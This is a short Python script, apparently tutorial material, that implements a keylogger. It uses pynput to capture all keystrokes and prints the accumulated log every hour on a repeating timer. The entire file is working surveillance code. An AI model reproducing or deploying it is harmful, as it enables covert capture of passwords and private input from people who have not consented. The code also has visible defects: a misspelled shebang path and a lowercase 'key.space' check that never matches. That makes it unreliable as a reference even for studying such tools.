#!/usr/bins/env python

import pynput.keyboard
import threading

log = ""


def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if str(key) == "key.space":
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(3600, report)
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()  # start listener
